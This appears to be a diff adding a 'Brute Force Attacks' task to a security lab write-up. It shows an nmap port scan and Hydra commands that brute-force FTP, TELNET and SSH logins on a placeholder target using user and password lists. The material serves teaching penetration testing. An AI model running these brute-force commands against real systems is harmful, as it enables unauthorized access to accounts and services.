@@ -36,3 +36,25 @@ nmap -p 21,23,22,80 <target-ip>
 ```
 ![image](https://github.com/user-attachments/assets/01080065-ba49-40d4-9e90-c1ca80dd6306)
 
+---
+
+# 🔐 Task 2: Brute Force Attacks
+
+## 2.1 FTP / TELNET / SSH
+
+Use Hydra to perform brute force attacks against the services FTP, TELNET, and SSH.
+
+---
+
+## 🛠️ Example Hydra Commands
+
+```bash
+# Brute force FTP login
+hydra -L userlist.txt -P passlist.txt ftp://<target-ip>
+
+# Brute force TELNET login
+hydra -L userlist.txt -P passlist.txt telnet://<target-ip>
+
+# Brute force SSH login
+hydra -L userlist.txt -P passlist.txt ssh://<target-ip>
+```
